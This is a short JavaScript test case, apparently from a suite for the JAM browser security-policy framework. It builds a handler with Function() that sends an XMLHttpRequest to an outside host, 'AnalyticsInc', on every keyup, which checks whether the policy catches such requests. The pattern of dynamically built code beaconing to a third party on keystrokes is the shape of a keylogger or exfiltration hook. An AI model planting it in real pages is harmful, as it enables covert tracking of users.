
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeyup2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("keyup", Function(exp), false)

}

JAM.stopProfile('load');
